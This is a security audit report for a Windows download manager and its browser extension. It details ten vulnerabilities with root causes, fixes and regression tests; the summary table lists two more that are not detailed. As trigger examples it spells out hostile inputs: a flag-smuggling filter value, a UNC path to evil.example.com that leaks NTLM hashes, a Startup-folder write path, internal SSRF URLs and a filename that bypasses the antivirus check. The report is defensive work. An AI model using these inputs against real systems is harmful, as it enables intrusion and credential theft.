# Security Vulnerability Audit Report

**Audit Date:** 2026-10-30  
**Commit:** `c5f68f4c95154e77bb8bfb59993fbd878554598d` (`main`)  
**Governance Reference:** `AGENTS.md` §7 (Non-Negotiable Security Requirements) and `docs/SECURITY_THREAT_MODEL.md` (`THREAT-001` through `THREAT-010`)

---

## Summary of Security Findings

| ID | Severity | Priority | Confidence | Title | Location | Violated Policy / Threat ID |
| :--- | :---: | :---: | :---: | :--- | :--- | :--- |
| **[SEC-001](#sec-001-zero-click-drive-by-arbitrary-file-write-via-unauthenticated-windowpostmessage--pre-prompt-chunked-transfer-commit)** | `CRITICAL` | `P0` | `CONFIRMED` | Zero-Click Drive-By Arbitrary File Write via Unauthenticated `window.postMessage` & Pre-Prompt Chunked Transfer Commit | `extension/js/content-script.js:837-967`, `src/ipc/ipc_server.cpp:860-904` | `THREAT-001`, `THREAT-003` |
| **[SEC-002](#sec-002-command-line-flag-injection-via-unquoted-filter-arguments--unescaped-backslashes-in-jobrsp)** | `CRITICAL` | `P0` | `CONFIRMED` | Command-Line Flag Injection via Unquoted Filter Arguments (`-sv`, `-sa`, `-ss`) & Unescaped Backslashes in `@job.rsp` | `src/engine_stream/nm3u8dl_re_adapter.cpp:109-118, 1381-1398`, `src/worker_stream/nm3u8dl_re_worker.cpp:167-188` | `AGENTS.md` §7.1, `THREAT-001` |
| **[SEC-003](#sec-003-false-negative-antivirus-bypass-via-filename-substring-matching-in-scanwithdefender)** | `CRITICAL` | `P0` | `CONFIRMED` | False-Negative Antivirus Bypass via Filename Substring Matching in `ScanWithDefender` | `src/security/antivirus_scanner.cpp:200-214`, `src/core/download_controller.cpp:1495-1507` | `THREAT-003` |
| **[SEC-004](#sec-004-ssrf-bypasses-in-validatemanifestsafety-rtspmmsadapter-and-sitegrabber)** | `CRITICAL` | `P0` | `CONFIRMED` | Multiple SSRF Bypasses in `ValidateManifestSafety` (`https://` Private IPs, `172.16.0.0/12`, IPv6 `::1`), `RtspMmsAdapter`, and `SiteGrabber` | `src/engine_stream/nm3u8dl_re_adapter.cpp:761-832`, `src/engine_stream/rtsp_mms_adapter.cpp:28-55`, `src/crawler/site_grabber.cpp:253-268` | `THREAT-004` |
| **[SEC-005](#sec-005-weak-savedir-validation-in-ipcserver-allows-writing-outside-downloads-folder-and-unc-smb-credential-leaks)** | `HIGH` | `P0` | `CONFIRMED` | Weak `saveDir` Validation in `IpcServer` Allows Writing Outside Destination Directory and Outbound UNC SMB Leaks | `src/ipc/ipc_server.cpp:563-586, 678-701, 1006-1010` | `AGENTS.md` §7.3, `THREAT-003` |
| **[SEC-006](#sec-006-arbitrary-local-file-read-in-nm3u8dl_re_worker-via-recursive-extractmanifestinfo-with-is_manifest_input--true)** | `HIGH` | `P0` | `CONFIRMED` | Arbitrary Local File Read in `nm3u8dl_re_worker.cpp` via Recursive `ExtractManifestInfo` with `is_manifest_input = true` | `src/worker_stream/nm3u8dl_re_worker.cpp:434-451, 836-934, 1022` | `AGENTS.md` §7.3, `THREAT-004` |
| **[SEC-007](#sec-007-cross-origin-redirect-credential-leak-via-winhttpsetcredentials--case-sensitive-header-erase-plus-https-to-http-downgrade)** | `HIGH` | `P0` | `CONFIRMED` | Cross-Origin Redirect Credential Leak via `WinHttpSetCredentials` & Case-Sensitive Header Erase, Plus HTTPS-to-HTTP Downgrade | `src/brisk_engine/http_client.cpp:848-866, 948-958`, `src/brisk_engine/http_download_engine.cpp:402-410` | `AGENTS.md` §7.5, `THREAT-006` |
| **[SEC-008](#sec-008-dns-rebinding-toctou-ssrf-on-winhttp-path--data-race-on-wsa_init)** | `HIGH` | `P1` | `CONFIRMED` | DNS Rebinding (TOCTOU) SSRF on WinHTTP Path & Data Race on `wsa_init` | `src/brisk_engine/http_client.cpp:141-200, 729, 822` | `THREAT-004` |
| **[SEC-009](#sec-009-plaintext-credentials-left-on-disk-in-jobrsp-on-early-error-incomplete-log-redaction-and-unredacted-json-export)** | `HIGH` | `P1` | `CONFIRMED` | Plaintext Credentials Left on Disk in `job.rsp` on Early Error, Incomplete Log Redaction, and Unredacted JSON Export | `src/engine_stream/nm3u8dl_re_adapter.cpp:1418-1566`, `src/common/logger.cpp:27-49`, `src/storage/import_export.cpp:19-37, 157-161` | `AGENTS.md` §7.2, §7.5, `THREAT-002`, `THREAT-007` |
| **[SEC-010](#sec-010-predictable-dht-transaction-ids-unverified-sender-ips-udp-amplification-and-uninitialized-stack-memory-in-trackerclient)** | `HIGH` | `P1` | `CONFIRMED` | Predictable DHT Transaction IDs, Unverified Sender IPs, UDP Amplification, and Uninitialized Stack Read in `TrackerClient::AnnounceUdp` | `src/engine_torrent/dht_client.hpp:81-186`, `src/engine_torrent/tracker_client.hpp:322-328` | Network Protocol Hardening |
| **[SEC-011](#sec-011-command-line-quoting--argument-injection-in-scanwithcustomexecutable--scanwithdefender)** | `HIGH` | `P1` | `CONFIRMED` | Command-Line Quoting / Argument Injection in `ScanWithCustomExecutable` & `ScanWithDefender` | `src/security/antivirus_scanner.cpp:183, 240-252` | `AGENTS.md` §7.1 |
| **[SEC-012](#sec-012-missing-setdefaultdlldirectories-process-hardening-and-missing-mark-of-the-web-zoneidentifier-propagation)** | `MEDIUM` | `P2` | `CONFIRMED` | Missing `SetDefaultDllDirectories` Process Hardening (`THREAT-009`) and Missing Mark-of-the-Web (`Zone.Identifier` ADS) Propagation | `src/app/main.cpp:62`, `src/nmh/main.cpp:199`, `src/brisk_engine/http_download_engine.cpp:1350` | `THREAT-009`, `docs/DATA_MODEL_AND_STORAGE.md:143` |

---

## Detailed Vulnerability Reports

### [SEC-001] Zero-Click Drive-By Arbitrary File Write via Unauthenticated `window.postMessage` & Pre-Prompt Chunked Transfer Commit
- **Category:** Security / Browser Extension & IPC Boundary
- **Severity:** `CRITICAL`
- **Priority:** `P0`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static trace across `catch.js` -> `content-script.js` -> `background.js` -> `ipc_server.cpp` -> `win32_main_window.cpp`
- **Location:**
  - `extension/catch-script/catch.js:9-29, 1303`
  - `extension/js/content-script.js:837-845, 948-967`
  - `extension/js/background.js:2280-2479`
  - `src/ipc/ipc_server.cpp:654-904`
  - `src/ui/win32_main_window.cpp:4732`
- **Evidence & Root Cause:**
  1. In `extension/catch-script/catch.js:9-29`, a per-instance random `MSG_NONCE` is generated and attached to `window.postMessage` payloads (`nonce: MSG_NONCE`). However, in `extension/js/content-script.js:837-845`, the `window.addEventListener("message", ...)` handler **never validates `ev.data.nonce`** (and has no shared secret with `catch.js`).
  2. At `extension/js/content-script.js:948-967`, when `ev.data.type === "radiumDirectBlobDownload"`, the content script forwards `base64Data`, `filename`, `mimeType`, and `size` directly to `background.js` without requiring user interaction or gesture activation.
  3. `extension/js/background.js:2396-2479` (`handleDirectBlobDownload`) streams those bytes to `radium.exe` over Native Messaging using `startChunkedTransfer`, `sendTransferChunk`, and `completeChunkedTransfer`.
  4. In `src/ipc/ipc_server.cpp:860-904` (`completeChunkedTransfer`), the IPC server **renames the `.part` file to its final destination filename inside `default_download_dir` (`std::filesystem::rename(part_fs, final_fs)` at line 868) and marks the task `kCompleted` in SQLite (`IngestCompletedTask` at line 889) BEFORE invoking `m_offer_cb` at line 896**!
  5. When `NewDownloadDlgProc` pops up in `src/ui/win32_main_window.cpp:4732` and the user clicks **Cancel / Close**, it calls `m_controller.RemoveTask(offer.task_id, false)` (`delete_files = false`), which removes the database row while leaving the finalized file on disk in `Downloads\`.
- **Trigger Scenario:**
  - A user visits any webpage containing third-party scripts or ads. The page script posts a `radiumDirectBlobDownload` message via `window.postMessage`. Without any click from the user, the payload is written to `%USERPROFILE%\Downloads\<filename>`, and even if the user dismisses the Radium dialog, the file remains on disk.
- **Impact:**
  - Zero-click drive-by file creation in the user's Downloads directory (or arbitrary user-writable directories when combined with `SEC-005`), bypassing the browser's download prompt and Mark-of-the-Web tagging.
- **Recommended Fix:**
  1. **Remove unauthenticated page-triggered blob pushing:** Require an explicit user click inside the extension's closed Shadow DOM overlay (`content-script.js`) or browser popup before initiating `startChunkedTransfer`.
  2. **Authenticate `MAIN` -> `ISOLATED` messages:** Pass a cryptographic per-injection token via a custom DOM event on a closed node or validate strict gesture state before accepting `radiumDirectBlobDownload`.
  3. **Prompt BEFORE committing in `IpcServer`:** Keep chunked transfers in a `.part` staging file inside `%LOCALAPPDATA%\Radium\tmp\` until the user clicks "Start Download" / "Save" in `m_offer_cb`. If the user cancels `NewDownloadDlgProc`, call `RemoveTask(offer.task_id, /*delete_files=*/true)` and delete the staged `.part` file.
- **Regression Test:**
  - Add an IPC unit test in `tests/cpp/unit_tests.cpp` verifying that `completeChunkedTransfer` does not create a file in `default_download_dir` when `m_offer_cb` declines the offer, and an extension test in `tests/test_extension_detection.js` verifying that unauthenticated `radiumDirectBlobDownload` messages without user gesture or valid nonce are rejected.

---

### [SEC-002] Command-Line Flag Injection via Unquoted Filter Arguments & Unescaped Backslashes in `@job.rsp`
- **Category:** Security / Command Injection (`AGENTS.md` §7.1)
- **Severity:** `CRITICAL`
- **Priority:** `P0`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis of `BuildResponseFileContent` and `ParseResponseFile`
- **Location:**
  - `src/engine_stream/nm3u8dl_re_adapter.cpp:109-118, 1381-1398`
  - `src/worker_stream/nm3u8dl_re_worker.cpp:167-188`
- **Evidence & Root Cause:**
  1. In `src/engine_stream/nm3u8dl_re_adapter.cpp:1381-1398`, `BuildResponseFileContent` writes stream selection filters directly into `job.rsp` without calling `QuoteResponseArg`:
     ```cpp
     out += "-sv " + SanitizeFilterValue(video_filter) + "\n";
     ```
     `SanitizeFilterValue` (lines 1368–1379) only strips `\r` and `\n`; it preserves spaces and quotes.
  2. In `src/worker_stream/nm3u8dl_re_worker.cpp:167-188`, `ParseResponseFile` parses each line of `@job.rsp` character-by-character and splits on any unquoted space (`std::isspace(c)`). Thus, if `selected_video_filter` (populated from IPC `videoFilter` or manifest stream attributes) contains whitespace followed by `--ffmpeg-binary-path` or `--save-dir`, `ParseResponseFile` injects arbitrary CLI flags into `N_m3u8DL-RE.exe`.
  3. Furthermore, `QuoteResponseArg` (`nm3u8dl_re_adapter.cpp:109-118`) only escapes `"` as `\"` without escaping `\`. If a Windows path (`--save-dir` or `--tmp-dir`) ends with a trailing backslash `\`, `\"` is parsed by `ParseResponseFile` (lines 176–179) and `CommandLineToArgvW` as an escaped literal quote, consuming the next flag into the path and desynchronizing all subsequent arguments.
- **Trigger Scenario:**
  - A webpage or manifest supplies a stream variant description/filter containing spaces and `--` flags, or a user's save directory ends in `\`.
- **Impact:**
  - Arbitrary `N_m3u8DL-RE.exe` flag injection (including `--ffmpeg-binary-path`, which `nm3u8dl_re_worker.cpp` executes via `CreateProcessW`), directly violating `AGENTS.md` §7.1 ("No Arbitrary Command Execution").
- **Recommended Fix:**
  1. Always pass every value in `BuildResponseFileContent` through `QuoteResponseArg`, or write one token per line in `job.rsp` and update `ParseResponseFile` appropriately.
  2. In `QuoteResponseArg`, escape backslashes (`\` -> `\\`) before escaping quotes (`"` -> `\"`), and validate `video_filter`, `audio_filter`, and `subtitle_filter` against a strict regex allowlist (`^[A-Za-z0-9_.:=-]+$`).
- **Regression Test:**
  - Add a unit test in `TC-STREAM-02` passing `selected_video_filter = "best --ffmpeg-binary-path C:\\calc.exe"` and `save_dir = "C:\\Downloads\\"` and asserting that `ParseResponseFile` treats the filter as a single literal argument (or rejects it) and preserves exact path boundaries.

---

### [SEC-003] False-Negative Antivirus Bypass via Filename Substring Matching in `ScanWithDefender`
- **Category:** Security / Malware Scanning
- **Severity:** `CRITICAL`
- **Priority:** `P0`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis
- **Location:**
  - `src/security/antivirus_scanner.cpp:200-214`
  - `src/core/download_controller.cpp:1495-1507`
- **Evidence & Root Cause:**
  - `MpCmdRun.exe -Scan -ScanType 3 -File "<path>"` echoes the scanned file path in its standard output (`Scanning <path> found ...`).
  - In `src/security/antivirus_scanner.cpp:200-214`, after checking `exit_code == 2` (`ThreatDetected`), `ScanWithDefender` lowers the entire `output` buffer (including the echoed filename!) and overrides the result based on naive substring searches:
    ```cpp
    if (lower_out.find("found no threats") != std::string::npos) {
      res.status = ScanResult::Status::kClean;
      res.threat_name.clear();
    } else if (exit_code != 0 && exit_code != 2 &&
               (lower_out.find("failed") != std::string::npos ||
                lower_out.find("error") != std::string::npos)) {
      res.status = ScanResult::Status::kError;
    }
    ```
  - Worse, in `src/core/download_controller.cpp:1495-1507`, only `ScanResult::Status::kThreatDetected` blocks the download; `kClean` and `kError` both allow the task to transition to `kCompleted`!
- **Trigger Scenario:**
  - A downloaded malicious executable is named `installer_found no threats.exe`. Even when Windows Defender detects malware and returns `exit_code == 2`, `lower_out.find("found no threats")` matches the filename echoed in `MpCmdRun.exe`'s stdout and overwrites `res.status` from `kThreatDetected` to `kClean`!
- **Impact:**
  - Trivial bypass of post-download Windows Defender malware detection via filename crafting.
- **Recommended Fix:**
  - Trust `MpCmdRun.exe`'s documented exit code (`exit_code == 2` is always `kThreatDetected`, `exit_code == 0` is `kClean` unless threat markers are present on the summary line). Never allow stdout substring matching to downgrade `exit_code == 2` to `kClean`.
- **Regression Test:**
  - Add a test case to `TC-AV-01` scanning a file named `eicar_found no threats.com` and asserting `res.status == ScanResult::Status::kThreatDetected`.

---

### [SEC-004] SSRF Bypasses in `ValidateManifestSafety`, `RtspMmsAdapter`, and `SiteGrabber`
- **Category:** Security / Server-Side Request Forgery (`THREAT-004`)
- **Severity:** `CRITICAL`
- **Priority:** `P0`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis
- **Location:**
  - `src/engine_stream/nm3u8dl_re_adapter.cpp:761-832`
  - `src/engine_stream/rtsp_mms_adapter.cpp:28-55`
  - `src/crawler/site_grabber.cpp:253-268`
- **Evidence & Root Cause:**
  1. **`ValidateManifestSafety` (`nm3u8dl_re_adapter.cpp:781-817`):**
     - Only checks string prefixes starting with `"http://"` (`lower.find("http://127.")`, `"http://localhost"`, `"http://10."`, `"http://192.168."`, `"http://169.254."`).
     - Completely ignores **`https://`** URLs (`https://127.0.0.1/...`, `https://localhost/...`, `https://192.168.1.1/...`), **RFC 1918 `172.16.0.0/12`** (`http://172.16.0.1/...` – `http://172.31.255.255/...`), **IPv6 loopback/link-local** (`http://[::1]/...`, `http://[fe80::1]/...`), **decimal/hex/octal IPs** (`http://2130706433/`), **relative segment URLs**, and **custom DNS hostnames resolving to `127.0.0.1`**!
  2. **`RtspMmsAdapter` (`rtsp_mms_adapter.cpp:28-55`):**
     - `IsPrivateOrLoopbackHost` only does string prefix matching on `127.`, `10.`, `192.168.`, `169.254.`, and `172.16.`–`172.31.`. It never performs DNS resolution (`GetAddrInfoW`) before spawning `ffmpeg.exe -i rtsp://...`, so any domain resolving to `127.0.0.1` (e.g., `localtest.me`) or decimal/hex IPv4 bypasses the check.
  3. **`SiteGrabber::IsPrivateHost` (`site_grabber.cpp:253-268`):**
     - Uses `inet_addr`, which parses dotted-only IPv4 and returns `INADDR_NONE` for IPv6 literals (`[::1]`), and never resolves DNS hostnames before crawling when using custom transport callbacks.
- **Trigger Scenario:**
  - A malicious HLS `.m3u8` manifest contains `#EXT-X-KEY:METHOD=AES-128,URI="https://127.0.0.1:8080/secret"` or `http://172.17.0.1/internal` or `http://localtest.me/admin`, or an `rtsp://localtest.me:8554/stream` URL is offered.
- **Impact:**
  - Full bypass of `THREAT-004` SSRF protections in the stream pipeline, RTSP adapter, and site crawler.
- **Recommended Fix:**
  - Centralize all URL host + DNS resolution SSRF validation into a single shared function (`HttpClient::ValidateUrlTargetSafety(url, allow_loopback)`) that parses the URL via `WinHttpCrackUrl`, resolves all `A` and `AAAA` records via `GetAddrInfoW`, and rejects loopback (`127.0.0.0/8`, `::1`), RFC 1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`, `fe80::/10`), ULA (`fc00::/7`), and IPv4-mapped IPv6 (`::ffff:127.0.0.1`). Call this shared validator for every manifest line URL, `#EXT-X-KEY` URI, `#EXT-X-MAP` URI, RTSP URL, and crawled link.
- **Regression Test:**
  - Extend `TC-SEC-02` to test `https://127.0.0.1/key.bin`, `http://172.16.0.1/seg.ts`, and `http://[::1]/seg.ts` inside `ValidateManifestSafety`.

---

### [SEC-005] Weak `saveDir` Validation in `IpcServer` Allows Writing Outside Downloads Folder and Outbound UNC SMB Leaks
- **Category:** Security / Path Traversal & Credential Leak (`AGENTS.md` §7.3, `THREAT-003`)
- **Severity:** `HIGH`
- **Priority:** `P0`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis
- **Location:** `src/ipc/ipc_server.cpp:563-586, 678-701, 1006-1010`
- **Evidence & Root Cause:**
  1. In `addDownload` (`ipc_server.cpp:563-586`) and `startChunkedTransfer` (`ipc_server.cpp:678-701`), the IPC server accepts an optional `saveDir` parameter from the browser extension message and checks only:
     - `raw_save_dir.find("..") == std::string::npos`
     - Starts with a drive letter `X:\`
     - Not `C:\Windows`, `C:\Program Files`, or `C:\ProgramData`.
     This allows **any user-writable directory on the machine**, including `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` or `%USERPROFILE%\.ssh`.
  2. In `addBatchDownloads` (`ipc_server.cpp:1006-1010`), the check is even weaker: it only checks `raw_dir.find("..") == std::string::npos` and `PathSanitizer::EnsureWithinDirectory(raw_dir, raw_dir)` (which trivially compares `raw_dir` against itself!). It does **not** reject UNC paths (`\\attacker.com\share`), so `std::filesystem::weakly_canonical` on Windows triggers an outbound SMB connection to `\\attacker.com\share`, leaking the user's Windows Net-NTLMv2 hash!
- **Trigger Scenario:**
  - A compromised extension context or webpage abusing an IPC message supplies `saveDir: "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"` or `saveDir: "\\\\evil.example.com\\share"` in `addBatchDownloads`.
- **Impact:**
  - Persistent code execution on next login (via Startup folder write) or outbound Windows Net-NTLMv2 credential theft over SMB.
- **Recommended Fix:**
  - Ignore arbitrary `saveDir` paths from untrusted extension messages unless `saveDir` is strictly a subdirectory of `m_controller.GetConfig().default_download_dir` verified via `PathSanitizer::EnsureWithinDirectory(default_download_dir, candidate_save_dir)`, and explicitly reject paths starting with `\\` or `//` before calling any filesystem API.
- **Regression Test:**
  - Add unit tests in `TC-IPC-02` verifying that `addDownload`, `startChunkedTransfer`, and `addBatchDownloads` reject `saveDir` outside `default_download_dir` and reject UNC paths (`\\127.0.0.1\share`).

---

### [SEC-006] Arbitrary Local File Read in `nm3u8dl_re_worker` via Recursive `ExtractManifestInfo` with `is_manifest_input = true`
- **Category:** Security / Arbitrary File Read & SSRF (`AGENTS.md` §7.3, `THREAT-004`)
- **Severity:** `HIGH`
- **Priority:** `P0`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis
- **Location:** `src/worker_stream/nm3u8dl_re_worker.cpp:434-451, 836-934, 1022`
- **Evidence & Root Cause:**
  1. When `Nm3u8dlReAdapter` downloads a remote `.m3u8` manifest to a temporary local file and invokes `N_m3u8DL-RE.exe <local_manifest_path>`, `nm3u8dl_re_worker.cpp:2088` sets `is_manifest_input = true`.
  2. Inside `ExtractManifestInfo` (`nm3u8dl_re_worker.cpp:836`), `fetch_text` (lines 838–848) checks `std::filesystem::exists(u)`. If `u` is a local file path, it reads the file directly from disk instead of fetching via HTTP!
  3. When a master playlist references a child playlist URL (`best_uri`), line 932 recursively calls:
     ```cpp
     return ExtractManifestInfo(best_uri, client, base_opts, is_manifest_input, cancel_flag, depth + 1);
     ```
     passing `is_manifest_input = true` down to the child URI!
  4. Furthermore, in `ResolveUrl` (`nm3u8dl_re_worker.cpp:434-451`), when `base_url` is a local file path (not starting with `http://` or `https://`), `ResolveUrl` returns any relative path (`C:\Windows\win.ini`) unchanged, and even when `base_url` is HTTP, `ResolveUrl` returns any `url` containing `"://"` (`file:///C:/...`) unchanged.
  5. Additionally, child playlists, media segments, and `#EXT-X-KEY` URIs fetched inside `nm3u8dl_re_worker.cpp` (`lines 515, 868, 1986`) set `opts.disallow_private_Drop = false` (`HttpRequestOptions` default), bypassing SSRF protection inside the worker process!
- **Trigger Scenario:**
  - A remote master `.m3u8` playlist contains a variant entry pointing to `C:\Users\<user>\...` or `http://127.0.0.1:...`. Because `Nm3u8dlReAdapter` saves the master playlist to a local temp file and passes its local path to `N_m3u8DL-RE.exe`, `is_manifest_input` is `true`, allowing the remote playlist to read local files or internal localhost services and mux them into the output file.
- **Impact:**
  - Arbitrary local file inclusion into downloaded media files and worker-side SSRF bypass.
- **Recommended Fix:**
  1. In `ExtractManifestInfo`, only allow `std::filesystem::exists` local file reading at `depth == 0` when `is_manifest_input == true`; all child playlists (`depth > 0`), segments, and `#EXT-X-KEY` URIs must require `http://` or `https://` schemes.
  2. Set `base_opts.disallow_private_Drop = true` in `nm3u8dl_re_worker.cpp` (unless `--allow-loopback` is explicitly passed for unit tests).
- **Regression Test:**
  - Add a test in `TC-STREAM-01` where a local master manifest (`depth == 0`) references a local file path (`C:\Windows\win.ini`) as a variant stream (`depth == 1`) and assert that `ExtractManifestInfo` rejects it with `ERR_SECURITY_VIOLATION`.

---

### [SEC-007] Cross-Origin Redirect Credential Leak via `WinHttpSetCredentials` & Case-Sensitive Header Erase, Plus HTTPS-to-HTTP Downgrade
- **Category:** Security / Credential Disclosure (`AGENTS.md` §7.5, `THREAT-006`)
- **Severity:** `HIGH`
- **Priority:** `P0`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis
- **Location:**
  - `src/brisk_engine/http_client.cpp:848-866, 948-958`
  - `src/brisk_engine/http_download_engine.cpp:402-410`
- **Evidence & Root Cause:**
  1. In `src/brisk_engine/http_client.cpp:948-958`, when an HTTP 301/302/307/308 redirect crosses origins (`!SameOrigin(current_parts, next_parts)`), `HttpClient` attempts to strip sensitive headers from `active_opts.headers`:
     ```cpp
     active_opts.headers.erase("Cookie");
     active_opts.headers.erase("Authorization");
     active_opts.headers.erase("Proxy-Authorization");
     ```
     Because `active_opts.headers` is a case-sensitive `std::map<std::string, std::string>`, lowercase or mixed-case headers (`"cookie"`, `"authorization"`, which HTTP/2 and browser extensions commonly emit) are **not erased** and are sent to the untrusted redirect target!
  2. Even worse, `active_opts.username` and `active_opts.password` (configured via `WinHttpSetCredentials` at lines 848–856) are **never cleared** on cross-origin redirects, so `redirect_opts` re-applies `WinHttpSetCredentials` on the new connection to the third-party host!
  3. In `src/brisk_engine/http_download_engine.cpp:402-410`, after `m_client.Probe` follows a cross-origin redirect and updates `task.final_url`, `HttpDownloadEngine::Execute` still keeps `task.cookies` and `task.headers` intact and attaches them to `MakeBaseOptions` for all subsequent segment Range requests to `task.final_url`!
  4. Neither `HttpClient` nor `HttpDownloadEngine` blocks or strips credentials on an `https://` -> `http://` scheme downgrade redirect on the same host (`https://example.com` -> `http://example.com` has `SameOrigin == false` due to port `443 != 80`, but `HttpDownloadEngine` still sends `task.cookies` to `task.final_url` over plaintext HTTP!).
- **Trigger Scenario:**
  - A download URL on `https://cdn-gateway.example.com/file?token=...` (with user session cookies or HTTP Basic Auth) redirects (`302 Found`) to `https://mirror.thirdparty.net/file` or `http://mirror.example.com/file`.
- **Impact:**
  - Session `Cookie` and HTTP `Authorization` credentials are leaked to third-party mirror servers or transmitted in cleartext over downgraded HTTP connections.
- **Recommended Fix:**
  1. On cross-origin redirects in `HttpClient::StreamGet`, clear `active_opts.username` and `active_opts.password`, and iterate `active_opts.headers` erasing any key matching `cookie`, `authorization`, or `proxy-authorization` case-insensitively.
  2. In `HttpDownloadEngine::Execute`, compare the origin of `task.url` with `probe_meta.final_url`; if they are not the same origin (`scheme + host + port`), do not forward `task.cookies` or `Authorization` headers in `MakeBaseOptions` to `final_url`.
- **Regression Test:**
  - Add a test in `TC-HTTP-06` verifying that lowercase `"authorization"` / `"cookie"` headers, `username`/`password`, and `task.cookies` are stripped when `Probe` or `StreamGet` redirects to a different origin or downgrades from `https` to `http`.

---

### [SEC-008] DNS Rebinding (TOCTOU) SSRF on WinHTTP Path & Data Race on `wsa_init`
- **Category:** Security / SSRF & Concurrency (`THREAT-004`)
- **Severity:** `HIGH`
- **Priority:** `P1`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis
- **Location:** `src/brisk_engine/http_client.cpp:141-200, 729, 822`
- **Evidence & Root Cause:**
  1. In `HttpClient::StreamGet` (`http_client.cpp:729`), `IsPrivateOrLoopbackHost(parts.host)` calls `GetAddrInfoW` to inspect the DNS records of `parts.host`, and then at line 822 `WinHttpConnect(session.get(), parts.host.c_str(), ...)` performs a **second, independent DNS lookup** inside WinHTTP. An attacker-controlled DNS server with `TTL=0` can return a public IP for the first lookup and `127.0.0.1` for the second lookup (DNS Rebinding TOCTOU).
  2. Inside `IsPrivateOrLoopbackHost` (`http_client.cpp:166-171`):
     ```cpp
     static bool wsa_init = false;
     if (!wsa_init) {
       WSADATA wsa;
       WSAStartup(MAKEWORD(2, 2), &wsa);
       wsa_init = true;
     }
     ```
     `static bool wsa_init` is read and written without synchronization across concurrent segment worker threads (C++20 data race / UB).
- **Recommended Fix:**
  - Use a C++11 magic static (`static const int kWsaInit = [](){ WSADATA w; return WSAStartup(MAKEWORD(2, 2), &w); }();`) for thread-safe initialization, and validate the connected peer IP address via WinHTTP status callback (`WINHTTP_CALLBACK_STATUS_CONNECTED_TO_SERVER`) to prevent DNS rebinding.

---

### [SEC-009] Plaintext Credentials Left on Disk in `job.rsp` on Early Error, Incomplete Log Redaction, and Unredacted JSON Export
- **Category:** Security / Credential Exposure (`AGENTS.md` §7.2, §7.5, `THREAT-002`, `THREAT-007`)
- **Severity:** `HIGH`
- **Priority:** `P1`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis
- **Location:**
  - `src/engine_stream/nm3u8dl_re_adapter.cpp:1418-1566`
  - `src/common/logger.cpp:27-49`
  - `src/storage/import_export.cpp:19-37, 157-161`
- **Evidence & Root Cause:**
  1. **Unlinked `job.rsp` on Early Return (`nm3u8dl_re_adapter.cpp:1418-1566`):** `Nm3u8dlReAdapter::Execute` writes `job.rsp` (containing plaintext `Cookie` and `Authorization` headers) at line 1418. If `CreatePipe` (line 1455), `SetHandleInformation` (lines 1463, 1471), or `CreateProcessW` (line 1510) fails, `Execute` returns early **before** reaching `CleanupTempWorkspace` at line 1566, leaving plaintext credentials on disk in `%LOCALAPPDATA%\Radium\tmp\<task_id>\job.rsp`!
  2. **Incomplete `Logger::RedactSensitiveData` (`src/common/logger.cpp:27-49`):**
     - The query token regex (`([?&](?:token|sig|signature|access_token|auth|hdnea|Policy|Key-Pair-Id)=)([^&\s"']+)`) omits `key` ( explicitly required by `AGENTS.md` §7.5: `token`, `sig`, `signature`, **`key`**, `hdnea`, `Policy`, `Key-Pair-Id`).
     - Does not redact HTTP Basic Auth credentials embedded in URLs (`https://user:password@example.com/file` or `ftp://user:password@host/file`).
     - In `kHeaderRegex`, `[^\r\n"]+` stops at the first `"` character, so a quoted cookie or header (`Cookie: session="secret_value"; theme=dark`) leaves `secret_value"; theme=dark` unredacted in `radium.log`!
  3. **Plaintext Credential Export (`src/storage/import_export.cpp:19-37, 157-161`):**
     - `ExportTasksToString` only redacts `Cookie`, `Authorization`, and `Proxy-Authorization` in `t.headers`, but exports **`t.cookies` in full plaintext** at line 157 (`t_obj["cookies"] = json::Value(t.cookies)`), and fails to redact custom authentication headers such as `X-Api-Key` or `X-Auth-Token`.
- **Recommended Fix:**
  1. Wrap `tmp_dir` in an RAII scope guard (`struct TempDirGuard { ~TempDirGuard() { CleanupTempWorkspace(dir); } };`) immediately before writing `job.rsp`.
  2. Add `key` to `kQueryTokenRegex`, add a URL userinfo regex (`(https?|ftp)://([^:/@\s]+):([^@\s]+)@`), and change `kHeaderRegex` value matching to `[^\r\n]+`.
  3. Redact or omit `t.cookies` in `ExportTasksToString` unless the user explicitly opts into encrypted export.

---

### [SEC-010] Predictable DHT Transaction IDs, Unverified Sender IPs, UDP Amplification, and Uninitialized Stack Memory in `TrackerClient`
- **Category:** Security / Network Protocol Hardening
- **Severity:** `HIGH`
- **Priority:** `P1`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis
- **Location:**
  - `src/engine_torrent/dht_client.hpp:81-186`
  - `src/engine_torrent/tracker_client.hpp:322-328`
- **Evidence & Root Cause:**
  1. **DHT Spoofing & Amplification (`dht_client.hpp:81-186`):** `DhtClient` uses predictable sequential transaction IDs (`"g1"`, `"g2"`, `"p1"`), never verifies `t` or the responder's source `sockaddr_in` in `recvfrom` (line 138), and trusts arbitrary `6`-byte compact peer/node entries inside `nodes` and `values` to recursively query up to `kMaxQueries = 48` victim IP:port targets per torrent.
  2. **Uninitialized Stack Read in `TrackerClient::AnnounceUdp` (`tracker_client.hpp:322-328`):**
     ```cpp
     uint8_t conn_resp[16];
     const int n = recvfrom(sock, reinterpret_cast<char*>(conn_resp), sizeof(conn_resp), 0, ...);
     const uint64_t connection_id = ReadBe64(conn_resp + 8);
     ```
     Line 325 checks `if (n < 16 && WSAGetLastError() != 0)` instead of `if (n < 16)`. When a UDP tracker returns a short packet (`0 <= n < 16`), `WSAGetLastError()` is `0`, so `ReadBe32(conn_resp + 4)` and `ReadBe64(conn_resp + 8)` read uninitialized stack memory and echo it back to the remote UDP server in the subsequent announce packet!
- **Recommended Fix:**
  1. Generate random 4-byte DHT transaction IDs via `BCryptGenRandom` and verify both the transaction ID `t` and source IP address on incoming UDP responses.
  2. Change line 325 of `tracker_client.hpp` to `if (n < 16) { closesocket(sock); return res; }`.

---

